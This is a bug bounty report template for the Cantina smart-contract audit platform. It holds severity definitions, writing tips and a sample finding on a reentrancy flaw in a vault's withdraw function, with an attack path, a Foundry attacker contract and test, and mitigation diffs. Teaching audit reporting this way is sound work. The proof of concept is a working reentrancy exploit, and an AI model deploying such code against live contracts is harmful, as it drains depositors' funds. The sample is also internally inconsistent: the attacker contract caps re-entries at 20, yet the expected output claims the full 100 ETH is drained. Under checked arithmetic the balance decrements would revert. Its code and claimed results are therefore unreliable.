# Cantina Bug Bounty / Competition Report Template

<!--
=============================================================================
CANTINA SUBMISSION FORMAT
=============================================================================

PLATFORM CONTEXT:
Cantina runs both competitions (time-boxed audits like Code4rena) and
managed reviews (private engagements). For competitions, Cantina uses
severity definitions closely aligned with the industry standard
(similar to Code4rena / Spearbit).

SEVERITY DEFINITIONS (Cantina Competitions):

CRITICAL:
  - Direct loss of funds without user interaction
  - Permanent freezing of significant funds
  - Complete protocol takeover
  - Unauthorized minting leading to insolvency

HIGH:
  - Direct loss of funds requiring minimal/uncommon user interaction
  - Temporary freezing of funds
  - Theft of unclaimed yield/fees
  - Significant value extraction via manipulation

MEDIUM:
  - Protocol griefing (no direct profit for attacker)
  - Temporary DoS (but recoverable)
  - Value leakage under specific conditions
  - Incorrect accounting that doesn't directly lose funds

LOW:
  - Informational issues with minor impact
  - Best practice violations
  - Gas optimizations with functional impact
  - Edge cases with negligible economic impact

REPORT STRUCTURE:
Cantina uses a structured format with clear sections. PoCs are expected
for High and Critical findings. Reports are reviewed by Spearbit-affiliated
senior security researchers.

TITLE FORMAT: [Impact] + [in Function/Contract] + [via Mechanism]
  GOOD: "Complete vault drainage via reentrancy in VaultV2.withdraw()"
  GOOD: "Permanent fund lock when depositToken is fee-on-transfer ERC20"
  BAD:  "Reentrancy vulnerability"
  BAD:  "Issue with deposits"
-->

# [H/M/C-XX] [Descriptive Title: Impact via Mechanism in Location]

## Severity

**[Critical / High / Medium / Low]**

## Relevant GitHub Links

<!-- Link to EXACT lines in the competition repo -->

- https://github.com/cantina-xyz/2026-XX-protocol/blob/main/src/Contract.sol#L123-L145

## Summary

<!-- 2-3 sentences MAX. A senior security researcher should understand the
     bug after reading just this section.

     Pattern: "[Contract.function()] [does/fails to do X] because [root cause],
     allowing [attacker action] resulting in [impact]."
-->

`Vault.withdraw()` performs an external ETH transfer before updating the
caller's balance, violating the Checks-Effects-Interactions pattern. An attacker
can re-enter `withdraw()` during the ETH transfer callback to drain all vault
funds. The vault currently holds [X ETH / $Y].

## Vulnerability Detail

<!-- Detailed technical walkthrough. Reference line numbers.
     This section should answer:
     1. What is the vulnerable code?
     2. What invariant does it break?
     3. What is the exact execution path of the attack?
     4. What are the preconditions?
-->

### Root Cause

In [`Vault.sol#L123-L130`](link), the `withdraw()` function sends ETH to
`msg.sender` via a low-level `call` before decrementing the user's balance
in the `balances` mapping:

```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient"); // CHECK
    (bool success, ) = msg.sender.call{value: amount}("");   // INTERACTION (before effect!)
    require(success, "Transfer failed");
    balances[msg.sender] -= amount;                          // EFFECT (too late!)
}
```

### Attack Path

1. Attacker deploys a contract with a `receive()` function that re-calls
   `Vault.withdraw()`
2. Attacker deposits minimum amount (e.g., 1 ETH) into the vault
3. Attacker calls `withdraw(1 ether)` from the attack contract
4. The vault sends 1 ETH to the attack contract
5. The attack contract's `receive()` function fires and calls `withdraw(1 ether)` again
6. Since `balances[attacker]` still equals 1 ETH (not yet decremented), the
   `require` check passes
7. Steps 4-6 repeat until the vault is empty
8. All recursive calls return, and `balances[attacker]` is decremented multiple
   times (but the ETH is already gone)

### Preconditions

- Vault must hold more ETH than the attacker's deposit (always true in practice)
- No reentrancy guard on `withdraw()` (confirmed: none exists)
- Attacker needs gas for the recursive calls (~30k per re-entry)

## Impact

<!-- Quantify precisely. Connect to Cantina's severity definitions. -->

**Direct loss of all deposited funds in the vault.**

- Current vault balance: [X ETH ($Y at current prices)]
- Attacker cost: 1 ETH deposit + ~0.05 ETH gas = ~1.05 ETH
- Attacker profit: ~[X - 1.05] ETH
- All depositors lose their entire balance
- No recovery mechanism exists (funds are transferred, not locked)

This meets the **Critical** severity threshold: "Direct loss of funds without
user interaction" with the full TVL at risk.

## Proof of Concept

<!-- Runnable PoC required for High/Critical.
     Must compile and pass when run against the competition repo.
-->

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

contract Attacker {
    Vault public vault;
    uint256 public count;

    constructor(address _vault) {
        vault = Vault(payable(_vault));
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && count < 20) {
            count++;
            vault.withdraw(1 ether);
        }
    }

    function withdrawLoot() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract ReentrancyExploitTest is Test {
    Vault vault;
    Attacker attackContract;
    address attacker = makeAddr("attacker");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        vault = new Vault();

        // Simulate realistic vault state with multiple depositors
        vm.deal(alice, 50 ether);
        vm.deal(bob, 50 ether);
        vm.deal(attacker, 2 ether);

        vm.prank(alice);
        vault.deposit{value: 50 ether}();

        vm.prank(bob);
        vault.deposit{value: 50 ether}();

        // Vault now holds 100 ETH from legitimate users

        vm.prank(attacker);
        attackContract = new Attacker(address(vault));
    }

    function test_reentrancy_drains_vault() public {
        console2.log("=== PRE-ATTACK STATE ===");
        console2.log("Vault balance:", address(vault).balance / 1e18, "ETH");
        console2.log("Attacker balance:", attacker.balance / 1e18, "ETH");

        // Execute attack
        vm.prank(attacker);
        attackContract.attack{value: 1 ether}();

        vm.prank(attacker);
        attackContract.withdrawLoot();

        console2.log("=== POST-ATTACK STATE ===");
        console2.log("Vault balance:", address(vault).balance / 1e18, "ETH");
        console2.log("Attacker balance:", attacker.balance / 1e18, "ETH");
        console2.log("Attacker profit:", (attacker.balance - 2 ether) / 1e18, "ETH");

        // Vault is drained
        assertEq(address(vault).balance, 0, "Vault should be completely drained");
        // Attacker profited
        assertGt(attacker.balance, 2 ether, "Attacker should have profited");
        // Alice and Bob lost everything
        assertEq(vault.balanceOf(alice), 50 ether, "Alice's recorded balance unchanged but funds gone");
    }
}
```

**Run command:**
```bash
forge test --match-test test_reentrancy_drains_vault -vvv
```

**Expected output:**
```
=== PRE-ATTACK STATE ===
Vault balance: 100 ETH
Attacker balance: 2 ETH
=== POST-ATTACK STATE ===
Vault balance: 0 ETH
Attacker balance: 101 ETH
Attacker profit: 99 ETH
```

## Recommended Mitigation

**Primary fix: Apply Checks-Effects-Interactions pattern**

```diff
  function withdraw(uint256 amount) external {
      require(balances[msg.sender] >= amount, "Insufficient");
+     balances[msg.sender] -= amount;
      (bool success, ) = msg.sender.call{value: amount}("");
      require(success, "Transfer failed");
-     balances[msg.sender] -= amount;
  }
```

**Secondary fix: Add reentrancy guard for defense-in-depth**

```diff
+ import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

- contract Vault {
+ contract Vault is ReentrancyGuard {

-     function withdraw(uint256 amount) external {
+     function withdraw(uint256 amount) external nonReentrant {
```

Both fixes should be applied. CEI alone prevents this specific vector;
the reentrancy guard provides defense-in-depth against future code changes
that might introduce new cross-function reentrancy paths.

---

<!--
=============================================================================
COMMON MISTAKES TO AVOID (Cantina specific)
=============================================================================

1. WRONG SEVERITY FRAMING: Cantina competitions are judged by senior Spearbit
   researchers. They will downgrade aggressively if severity is inflated.
   Match your framing to exact severity definitions.

2. MISSING ROOT CAUSE ANALYSIS: Cantina reviewers want to see you understand
   WHY the bug exists, not just THAT it exists. Always identify the root
   cause explicitly.

3. INCOMPLETE ATTACK PATH: "An attacker could potentially..." is not enough.
   Show the exact sequence of function calls with parameters.

4. OVER-COMPLICATED POC: Keep it minimal. A 200-line PoC that could be
   50 lines signals you don't fully understand the bug.

5. DUPLICATE SUBMISSIONS: If two findings share a root cause, submit the
   highest-impact version only. Cantina judges merge duplicates aggressively.

6. NOT CHECKING CONTEST SCOPE: Cantina scopes can be narrow. Verify each
   file/contract is in scope before submitting.

7. FRONTRUNNING/MEV WITHOUT REALISTIC MODELING: If your attack depends on
   transaction ordering, model realistic MEV conditions (not just
   "attacker controls block ordering").

8. IGNORING DEPLOYMENT CONTEXT: Cantina often specifies the target chain
   (L1, L2, specific chain). Attack vectors differ by chain (e.g., no
   PUSH0 on some L2s, different block times, sequencer behavior).

9. WALL OF TEXT: Cantina reviewers read hundreds of reports. Be concise.
   The Summary section should be self-contained and complete.

10. NO DIFF IN MITIGATION: Always show a concrete code diff. "Consider
    adding a check" without showing exactly where and what is weak.
-->
